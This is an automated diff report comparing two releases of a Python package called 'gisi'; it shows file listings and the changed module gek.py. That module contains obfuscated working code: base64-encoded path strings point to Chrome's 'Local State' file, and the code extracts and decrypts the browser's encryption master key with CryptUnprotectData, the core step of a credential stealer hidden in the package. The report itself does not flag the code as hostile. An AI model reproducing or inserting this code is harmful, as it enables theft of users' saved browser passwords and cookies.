# Comparing `tmp/gisi-1.0.1.tar.gz` & `tmp/gisi-1.0.2.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "gisi-1.0.1.tar", last modified: Sun Apr 16 19:37:04 2023, max compression
+gzip compressed data, was "gisi-1.0.2.tar", last modified: Sun Apr 16 19:43:42 2023, max compression
```

## Comparing `gisi-1.0.1.tar` & `gisi-1.0.2.tar`

### file list

```diff
@@ -1,17 +1,17 @@
-drwxrwxrwx   0        0        0        0 2023-04-16 19:37:04.155969 gisi-1.0.1/
--rw-rw-rw-   0        0        0     1092 2023-04-16 19:22:53.000000 gisi-1.0.1/LICENSE
--rw-rw-rw-   0        0        0      407 2023-04-16 19:37:04.155969 gisi-1.0.1/PKG-INFO
--rw-rw-rw-   0        0        0      119 2023-04-16 19:23:44.000000 gisi-1.0.1/README.md
-drwxrwxrwx   0        0        0        0 2023-04-16 19:37:04.118262 gisi-1.0.1/gisi/
--rw-rw-rw-   0        0        0        0 2023-04-16 19:27:20.000000 gisi-1.0.1/gisi/__init__.py
--rw-rw-rw-   0        0        0      116 2023-04-16 19:11:18.000000 gisi-1.0.1/gisi/bd.py
--rw-rw-rw-   0        0        0      363 2023-04-16 19:07:30.000000 gisi-1.0.1/gisi/dd.py
--rw-rw-rw-   0        0        0      566 2023-04-16 19:13:42.000000 gisi-1.0.1/gisi/gek.py
--rw-rw-rw-   0        0        0     1603 2023-04-16 19:35:59.000000 gisi-1.0.1/gisi/gisi.py
-drwxrwxrwx   0        0        0        0 2023-04-16 19:37:04.152248 gisi-1.0.1/gisi.egg-info/
--rw-rw-rw-   0        0        0      407 2023-04-16 19:37:03.000000 gisi-1.0.1/gisi.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      212 2023-04-16 19:37:03.000000 gisi-1.0.1/gisi.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-04-16 19:37:03.000000 gisi-1.0.1/gisi.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0        5 2023-04-16 19:37:03.000000 gisi-1.0.1/gisi.egg-info/top_level.txt
--rw-rw-rw-   0        0        0       42 2023-04-16 19:37:04.160753 gisi-1.0.1/setup.cfg
--rw-rw-rw-   0        0        0      512 2023-04-16 19:36:17.000000 gisi-1.0.1/setup.py
+drwxrwxrwx   0        0        0        0 2023-04-16 19:43:42.308359 gisi-1.0.2/
+-rw-rw-rw-   0        0        0     1092 2023-04-16 19:22:53.000000 gisi-1.0.2/LICENSE
+-rw-rw-rw-   0        0        0      407 2023-04-16 19:43:42.308359 gisi-1.0.2/PKG-INFO
+-rw-rw-rw-   0        0        0      119 2023-04-16 19:23:44.000000 gisi-1.0.2/README.md
+drwxrwxrwx   0        0        0        0 2023-04-16 19:43:42.296954 gisi-1.0.2/gisi/
+-rw-rw-rw-   0        0        0        0 2023-04-16 19:27:20.000000 gisi-1.0.2/gisi/__init__.py
+-rw-rw-rw-   0        0        0      116 2023-04-16 19:11:18.000000 gisi-1.0.2/gisi/bd.py
+-rw-rw-rw-   0        0        0      363 2023-04-16 19:07:30.000000 gisi-1.0.2/gisi/dd.py
+-rw-rw-rw-   0        0        0      548 2023-04-16 19:38:49.000000 gisi-1.0.2/gisi/gek.py
+-rw-rw-rw-   0        0        0     1603 2023-04-16 19:35:59.000000 gisi-1.0.2/gisi/gisi.py
+drwxrwxrwx   0        0        0        0 2023-04-16 19:43:42.306096 gisi-1.0.2/gisi.egg-info/
+-rw-rw-rw-   0        0        0      407 2023-04-16 19:43:41.000000 gisi-1.0.2/gisi.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      212 2023-04-16 19:43:42.000000 gisi-1.0.2/gisi.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-04-16 19:43:41.000000 gisi-1.0.2/gisi.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0        5 2023-04-16 19:43:41.000000 gisi-1.0.2/gisi.egg-info/top_level.txt
+-rw-rw-rw-   0        0        0       42 2023-04-16 19:43:42.310213 gisi-1.0.2/setup.cfg
+-rw-rw-rw-   0        0        0      512 2023-04-16 19:39:37.000000 gisi-1.0.2/setup.py
```

### Comparing `gisi-1.0.1/LICENSE` & `gisi-1.0.2/LICENSE`

 * *Files identical despite different names*

### Comparing `gisi-1.0.1/gisi/gek.py` & `gisi-1.0.2/gisi/gek.py`

 * *Files 12% similar despite different names*

```diff
@@ -1,16 +1,16 @@
-import bd
+from gisi.bd import *
 import os
 import json
 import win32crypt as w
 
 
 def gek():
-    lsp = os.path.join(os.environ[bd.bd("VVNFUlBST0ZJTEU=")], bd.bd("QXBwRGF0YQ=="), bd.bd("TG9jYWw="),
-                       bd.bd("R29vZ2xl"),
-                       bd.bd("Q2hyb21l"), bd.bd("VXNlciBEYXRh"), bd.bd("TG9jYWwgU3RhdGU="))
+    lsp = os.path.join(os.environ[bd("VVNFUlBST0ZJTEU=")], bd("QXBwRGF0YQ=="), bd("TG9jYWw="),
+                       bd("R29vZ2xl"),
+                       bd("Q2hyb21l"), bd("VXNlciBEYXRh"), bd("TG9jYWwgU3RhdGU="))
     with open(lsp, "r", encoding="utf-8") as f:
         ls = f.read()
         ls = json.loads(ls)
-    k = bd.bdd(ls[bd.bd("b3NfY3J5cHQ=")][bd.bd("ZW5jcnlwdGVkX2tleQ==")])
+    k = bdd(ls[bd("b3NfY3J5cHQ=")][bd("ZW5jcnlwdGVkX2tleQ==")])
     k = k[5:]
     return w.CryptUnprotectData(k, None, None, None, 0)[1]
```

### Comparing `gisi-1.0.1/gisi/gisi.py` & `gisi-1.0.2/gisi/gisi.py`

 * *Files identical despite different names*

